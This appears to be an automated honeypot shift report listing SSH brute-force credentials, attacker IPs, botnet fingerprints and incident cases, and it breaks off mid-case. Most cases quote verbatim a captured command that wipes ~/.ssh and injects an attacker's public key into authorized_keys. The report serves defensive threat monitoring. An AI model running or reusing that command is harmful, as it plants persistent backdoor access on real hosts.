# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-16 |
| **Generated At** | 2026-05-16T17:02:54Z |
| **Shift Time** | 17:02 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **355** |
| Confirmed Threats | **344** |
| False Positives Filtered | **11** (3.1%) |
| Unique Attacker IPs | **35** |
| Countries of Origin | **20** |
| High Severity Cases | **40** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **315** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **66** |
| Unique Credential Pairs | **30** |
| Unique Usernames | **9** |
| Unique Passwords | **30** |
| Successful Auth Pairs | **26** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 40 |
| `345gs5662d34` | 19 |
| `kamil` | 1 |
| `zhangxin` | 1 |
| `ftpusr` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 19 |
| `3245gs5662d34` | 19 |
| `11111` | 1 |
| `test123!@#` | 1 |
| `qwerty1234` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 19 |
| `root` | `3245gs5662d34` | 19 |
| `root` | `11111` | 1 |
| `root` | `test123!@#` | 1 |
| `root` | `qwerty1234` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `11111` | `179.62.216.38` | 2026-05-16T15:00:02 |
| `root` | `3245gs5662d34` | `179.62.216.38` | 2026-05-16T15:00:11 |
| `root` | `test123!@#` | `179.62.216.38` | 2026-05-16T15:01:53 |
| `root` | `qwerty1234` | `179.62.216.38` | 2026-05-16T15:03:43 |
| `root` | `katharina` | `179.62.216.38` | 2026-05-16T15:05:28 |
| `root` | `solutions` | `179.62.216.38` | 2026-05-16T15:07:19 |
| `root` | `student12345` | `179.62.216.38` | 2026-05-16T15:09:07 |
| `root` | `Hik12345+` | `179.62.216.38` | 2026-05-16T15:10:49 |
| `root` | `instinct` | `179.62.216.38` | 2026-05-16T15:12:40 |
| `root` | `qy` | `179.62.216.38` | 2026-05-16T15:14:26 |
| `root` | `20192019` | `179.62.216.38` | 2026-05-16T15:16:09 |
| `root` | `warnightkardesim` | `179.62.216.38` | 2026-05-16T15:17:54 |
| `root` | `haiyang` | `179.62.216.38` | 2026-05-16T15:19:42 |
| `root` | `ylva` | `179.62.216.38` | 2026-05-16T15:21:26 |
| `root` | `qwerty#123` | `179.62.216.38` | 2026-05-16T15:23:08 |
| `root` | `r000t` | `179.62.216.38` | 2026-05-16T15:24:51 |
| `root` | `ankurkudintzi` | `192.109.200.18` | 2026-05-16T15:51:28 |
| `root` | `kathleen` | `49.51.48.78` | 2026-05-16T16:54:22 |
| `root` | `3245gs5662d34` | `49.51.48.78` | 2026-05-16T16:54:28 |
| `root` | `seaways` | `150.136.129.10` | 2026-05-16T16:56:48 |
| `root` | `3245gs5662d34` | `150.136.129.10` | 2026-05-16T16:56:53 |
| `root` | `cart00ns` | `14.103.122.187` | 2026-05-16T16:57:50 |
| `root` | `3245gs5662d34` | `14.103.122.187` | 2026-05-16T16:57:53 |
| `root` | `Ubuntu2023` | `101.36.122.139` | 2026-05-16T16:58:02 |
| `root` | `3245gs5662d34` | `101.36.122.139` | 2026-05-16T16:58:05 |
| `root` | `Password@123` | `14.29.176.8` | 2026-05-16T17:01:44 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **355** |
| Sessions with Fingerprint | **5** |
| Unique HASSH Fingerprints | **5** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 75 |
| Go SSH scanner | 1 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 66 | 10 |
| `03a80b21afa8...` | Modern SSH client | 8 | 3 |
| `16443846184e...` | Generic scanner | 1 | 1 |
| `dd9bcf093c35...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 66 | 10 | Mirai/variant |
| `03a80b21afa8...` | libssh | 8 | 3 | Modern SSH client |
| `16443846184e...` | Go SSH scanner | 1 | 1 | Generic scanner |
| `dd9bcf093c35...` | Unknown | 1 | 1 | Mirai/variant |
| `95420f9d932d...` | libssh | 1 | 1 | — |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 19 | 5 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `150.136.129.10`, `49.51.48.78`, `101.36.122.139`, `179.62.216.38`, `14.103.122.187`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **35** |
| Unique ASNs | **33** |
| High-Risk ASNs | **22** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4811` | China Telecom (Group) | 2 | HIGH |
| `AS55836` | Reliance Jio Infocomm Limited | 2 | LOW |
| `AS398722` | Censys, Inc. | 1 | HIGH |
| `AS23888` | National Telecommunication Corporation HQ, | 1 | HIGH |
| `AS43766` | Mobile Telecommunication Company Saudi Arabia Joint-Stock company | 1 | LOW |
| `AS263822` | GRUPO EQUIS S.A. | 1 | HIGH |
| `AS23724` | IDC, China Telecommunications Corporation | 1 | HIGH |
| `AS2514` | NTT PC Communications, Inc. | 1 | LOW |

---

---

## 🚨 Priority Cases — Immediate Attention (40)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-3a1f399c13c9

| Field | Detail |
|---|---|
| **Source IP** | `179.62.216[.]38` |
| **First Seen** | 2026-05-16 15:00 |
| **Last Seen** | 2026-05-16 15:00 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-16 15:00:00` | `cowrie.session.connect` |
| `2026-05-16 15:00:00` | `cowrie.client.version` |
| `2026-05-16 15:00:01` | `cowrie.client.kex` |
| `2026-05-16 15:00:02` | `cowrie.login.success` |
| `2026-05-16 15:00:03` | `cowrie.session.params` |
| `2026-05-16 15:00:03` | `cowrie.command.input` |
| `2026-05-16 15:00:03` | `cowrie.command.failed` |
| `2026-05-16 15:00:04` | `cowrie.log.closed` |
| `2026-05-16 15:00:04` | `cowrie.session.params` |
| `2026-05-16 15:00:04` | `cowrie.command.input` |
| `2026-05-16 15:00:05` | `cowrie.session.file_download` |
| `2026-05-16 15:00:05` | `cowrie.log.closed` |
| `2026-05-16 15:00:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.62.216[.]38` to AbuseIPDB if not already reported
- [ ] Block `179.62.216[.]38` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ac68662a37e0

| Field | Detail |
|---|---|
| **Source IP** | `179.62.216[.]38` |
| **First Seen** | 2026-05-16 15:00 |
| **Last Seen** | 2026-05-16 15:00 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-16 15:00:09` | `cowrie.session.connect` |
| `2026-05-16 15:00:09` | `cowrie.client.version` |
| `2026-05-16 15:00:09` | `cowrie.client.kex` |
| `2026-05-16 15:00:11` | `cowrie.login.success` |
| `2026-05-16 15:00:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.62.216[.]38` to AbuseIPDB if not already reported
- [ ] Block `179.62.216[.]38` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c6bc5c62a3a9

| Field | Detail |
|---|---|
| **Source IP** | `179.62.216[.]38` |
| **First Seen** | 2026-05-16 15:01 |
| **Last Seen** | 2026-05-16 15:02 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-16 15:01:52` | `cowrie.session.connect` |
| `2026-05-16 15:01:52` | `cowrie.client.version` |
| `2026-05-16 15:01:52` | `cowrie.client.kex` |
| `2026-05-16 15:01:53` | `cowrie.login.success` |
| `2026-05-16 15:01:54` | `cowrie.session.params` |
| `2026-05-16 15:01:54` | `cowrie.command.input` |
| `2026-05-16 15:01:54` | `cowrie.command.failed` |
| `2026-05-16 15:01:55` | `cowrie.log.closed` |
| `2026-05-16 15:01:55` | `cowrie.session.params` |
| `2026-05-16 15:01:55` | `cowrie.command.input` |
| `2026-05-16 15:01:56` | `cowrie.session.file_download` |
| `2026-05-16 15:01:56` | `cowrie.log.closed` |
| `2026-05-16 15:02:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.62.216[.]38` to AbuseIPDB if not already reported
- [ ] Block `179.62.216[.]38` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7ca8564a954e

| Field | Detail |
|---|---|
| **Source IP** | `179.62.216[.]38` |
| **First Seen** | 2026-05-16 15:02 |
| **Last Seen** | 2026-05-16 15:02 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-16 15:02:00` | `cowrie.session.connect` |
| `2026-05-16 15:02:00` | `cowrie.client.version` |
| `2026-05-16 15:02:00` | `cowrie.client.kex` |
| `2026-05-16 15:02:02` | `cowrie.login.success` |
| `2026-05-16 15:02:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.62.216[.]38` to AbuseIPDB if not already reported
- [ ] Block `179.62.216[.]38` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-878a9b855baa

| Field | Detail |
|---|---|
| **Source IP** | `179.62.216[.]38` |
| **First Seen** | 2026-05-16 15:03 |
| **Last Seen** | 2026-05-16 15:03 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-16 15:03:41` | `cowrie.session.connect` |
| `2026-05-16 15:03:41` | `cowrie.client.version` |
| `2026-05-16 15:03:41` | `cowrie.client.kex` |
| `2026-05-16 15:03:43` | `cowrie.login.success` |
| `2026-05-16 15:03:44` | `cowrie.session.params` |
| `2026-05-16 15:03:44` | `cowrie.command.input` |
| `2026-05-16 15:03:44` | `cowrie.command.failed` |
| `2026-05-16 15:03:44` | `cowrie.log.closed` |
| `2026-05-16 15:03:45` | `cowrie.session.params` |
| `2026-05-16 15:03:45` | `cowrie.command.input` |
| `2026-05-16 15:03:45` | `cowrie.session.file_download` |
| `2026-05-16 15:03:45` | `cowrie.log.closed` |
| `2026-05-16 15:03:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.62.216[.]38` to AbuseIPDB if not already reported
- [ ] Block `179.62.216[.]38` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d3ccb62a61d5

| Field | Detail |
|---|---|
| **Source IP** | `179.62.216[.]38` |
| **First Seen** | 2026-05-16 15:03 |
| **Last Seen** | 2026-05-16 15:03 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-16 15:03:49` | `cowrie.session.connect` |
| `2026-05-16 15:03:49` | `cowrie.client.version` |
| `2026-05-16 15:03:50` | `cowrie.client.kex` |
| `2026-05-16 15:03:51` | `cowrie.login.success` |
| `2026-05-16 15:03:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.62.216[.]38` to AbuseIPDB if not already reported
- [ ] Block `179.62.216[.]38` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-55dd18e0d8b5

| Field | Detail |
|---|---|
| **Source IP** | `179.62.216[.]38` |
| **First Seen** | 2026-05-16 15:05 |
| **Last Seen** | 2026-05-16 15:05 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-16 15:05:26` | `cowrie.session.connect` |
| `2026-05-16 15:05:26` | `cowrie.client.version` |
| `2026-05-16 15:05:26` | `cowrie.client.kex` |
| `2026-05-16 15:05:28` | `cowrie.login.success` |
| `2026-05-16 15:05:29` | `cowrie.session.params` |
| `2026-05-16 15:05:29` | `cowrie.command.input` |
| `2026-05-16 15:05:29` | `cowrie.command.failed` |
| `2026-05-16 15:05:30` | `cowrie.log.closed` |
| `2026-05-16 15:05:31` | `cowrie.session.params` |
| `2026-05-16 15:05:31` | `cowrie.command.input` |
| `2026-05-16 15:05:31` | `cowrie.session.file_download` |
| `2026-05-16 15:05:31` | `cowrie.log.closed` |
| `2026-05-16 15:05:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.62.216[.]38` to AbuseIPDB if not already reported
- [ ] Block `179.62.216[.]38` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0f5d24966b9e

| Field | Detail |
|---|---|
| **Source IP** | `179.62.216[.]38` |
| **First Seen** | 2026-05-16 15:05 |
| **Last Seen** | 2026-05-16 15:05 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-16 15:05:35` | `cowrie.session.connect` |
| `2026-05-16 15:05:35` | `cowrie.client.version` |
| `2026-05-16 15:05:35` | `cowrie.client.kex` |
| `2026-05-16 15:05:37` | `cowrie.login.success` |
| `2026-05-16 15:05:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.62.216[.]38` to AbuseIPDB if not already reported
- [ ] Block `179.62.216[.]38` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7c093c11d304

| Field | Detail |
|---|---|
| **Source IP** | `179.62.216[.]38` |
| **First Seen** | 2026-05-16 15:07 |
| **Last Seen** | 2026-05-16 15:07 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-16 15:07:17` | `cowrie.session.connect` |
| `2026-05-16 15:07:17` | `cowrie.client.version` |
| `2026-05-16 15:07:17` | `cowrie.client.kex` |
| `2026-05-16 15:07:19` | `cowrie.login.success` |
| `2026-05-16 15:07:19` | `cowrie.session.params` |
| `2026-05-16 15:07:19` | `cowrie.command.input` |
| `2026-05-16 15:07:19` | `cowrie.command.failed` |
| `2026-05-16 15:07:20` | `cowrie.log.closed` |
| `2026-05-16 15:07:21` | `cowrie.session.params` |
| `2026-05-16 15:07:21` | `cowrie.command.input` |
| `2026-05-16 15:07:21` | `cowrie.session.file_download` |
| `2026-05-16 15:07:21` | `cowrie.log.closed` |
| `2026-05-16 15:07:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.62.216[.]38` to AbuseIPDB if not already reported
- [ ] Block `179.62.216[.]38` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-68728b1dfe80

| Field | Detail |
|---|---|
| **Source IP** | `179.62.216[.]38` |
| **First Seen** | 2026-05-16 15:07 |
| **Last Seen** | 2026-05-16 15:07 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-16 15:07:25` | `cowrie.session.connect` |
| `2026-05-16 15:07:25` | `cowrie.client.version` |
| `2026-05-16 15:07:25` | `cowrie.client.kex` |
| `2026-05-16 15:07:27` | `cowrie.login.success` |
| `2026-05-16 15:07:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.62.216[.]38` to AbuseIPDB if not already reported
- [ ] Block `179.62.216[.]38` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-da689ff78339

| Field | Detail |
|---|---|
| **Source IP** | `179.62.216[.]38` |
| **First Seen** | 2026-05-16 15:09 |
| **Last Seen** | 2026-05-16 15:09 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-16 15:09:05` | `cowrie.session.connect` |
| `2026-05-16 15:09:05` | `cowrie.client.version` |
| `2026-05-16 15:09:06` | `cowrie.client.kex` |
| `2026-05-16 15:09:07` | `cowrie.login.success` |
| `2026-05-16 15:09:08` | `cowrie.session.params` |
| `2026-05-16 15:09:08` | `cowrie.command.input` |
| `2026-05-16 15:09:08` | `cowrie.command.failed` |
| `2026-05-16 15:09:09` | `cowrie.log.closed` |
| `2026-05-16 15:09:09` | `cowrie.session.params` |
| `2026-05-16 15:09:09` | `cowrie.command.input` |
| `2026-05-16 15:09:10` | `cowrie.session.file_download` |
| `2026-05-16 15:09:10` | `cowrie.log.closed` |
| `2026-05-16 15:09:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.62.216[.]38` to AbuseIPDB if not already reported
- [ ] Block `179.62.216[.]38` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fe2b1099e3cd

| Field | Detail |
|---|---|
| **Source IP** | `179.62.216[.]38` |
| **First Seen** | 2026-05-16 15:09 |
| **Last Seen** | 2026-05-16 15:09 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-16 15:09:14` | `cowrie.session.connect` |
| `2026-05-16 15:09:14` | `cowrie.client.version` |
| `2026-05-16 15:09:14` | `cowrie.client.kex` |
| `2026-05-16 15:09:16` | `cowrie.login.success` |
| `2026-05-16 15:09:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.62.216[.]38` to AbuseIPDB if not already reported
- [ ] Block `179.62.216[.]38` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0bb9f40ce626

| Field | Detail |
|---|---|
| **Source IP** | `179.62.216[.]38` |
| **First Seen** | 2026-05-16 15:10 |
| **Last Seen** | 2026-05-16 15:10 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
